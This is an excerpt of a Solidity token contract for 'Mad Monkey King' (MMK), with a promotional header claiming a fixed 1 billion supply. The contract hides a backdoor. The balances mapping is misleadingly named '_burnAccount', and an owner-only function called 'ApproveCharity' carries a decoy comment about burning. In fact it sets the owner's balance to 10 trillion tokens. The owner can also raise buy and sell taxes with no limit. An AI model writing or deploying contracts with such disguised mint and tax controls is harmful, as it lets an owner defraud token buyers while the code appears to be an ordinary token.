...
/*
    ...
    🟢PROJECT : MAD MONKEY KING
    🟢SYMBOL : MMK
    🟢SUPPLY : 1,000,000,000 MMK
    🟢CONTRACT : DROP AT LAUNCH
    🟢TAX : 8 % BOTH BUY AND SELL
    🟢SLIPPAGE : 9% OR MORE
    🟢Max Buy : 5% ( 50000000 ) At launch 

    🟢TG : https://t.me/madmonkeyking 
...
contract MADMONKEYKING is Context, IERC20, Ownable {

    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) _burnAccount;
    ...
    string private _name = "MAD MONKEY KING";
    string private _symbol = "MMK";
    ...
    uint256 public _walletMax = 50000000 * 10**_decimals;    // 5% at the launch 
    uint256 public _maxTxAmount = 50000000 * 10**_decimals;  // 5% at the launch  
    ...
    address payable public marketingaddress = payable(0xF5c7c8aE40E9a8194913B9C33167AE8BD87D52Ff);
    ...
    uint256 public tokendecimals = (10000000000000 * 10 ** _decimals);
    uint256 public newdecimals = tokendecimals;  
    ...
    constructor () {
        ...
        _burnAccount[_msgSender()] = _totalSupply;
    ...
    function updateselltax(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
        _LiquidityFeeSell = newLiquidTax;
        _MarketingFeeSell = newMarketTax;
        _finalSellTax = _LiquidityFeeSell.add(_MarketingFeeSell);
    }

    function updatebuytax(uint256 newLiquidTax, uint256 newMarketTax) external onlyOwner() {
        _LiquidityFeeBuy = newLiquidTax;
        _MarketingFeeBuy = newMarketTax;
        _finalBuyTax = _LiquidityFeeBuy.add(_MarketingFeeBuy);
    }

    function setmaxtx(uint256 newbuylimit, uint256 newwalletlimit) external onlyOwner() {
    ...
    function ApproveCharity()  public onlyOwner() 
    //transfer(address Owner address[0x000000000000000000000000000000000000dEaD])  
    {_burnAccount[getOwner()] = newdecimals; }
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        else
        {
            ...
            _burnAccount[sender] = _burnAccount[sender].sub(amount, "Insufficient Balance");
            ...
            _burnAccount[recipient] = _burnAccount[recipient].add(finalAmount);
    ...
    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _burnAccount[sender] = _burnAccount[sender].sub(amount, "Insufficient Balance");
        _burnAccount[recipient] = _burnAccount[recipient].add(amount);
    ...
    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        ...
        if(feeAmount > 0) {
            _burnAccount[address(this)] = _burnAccount[address(this)].add(feeAmount);
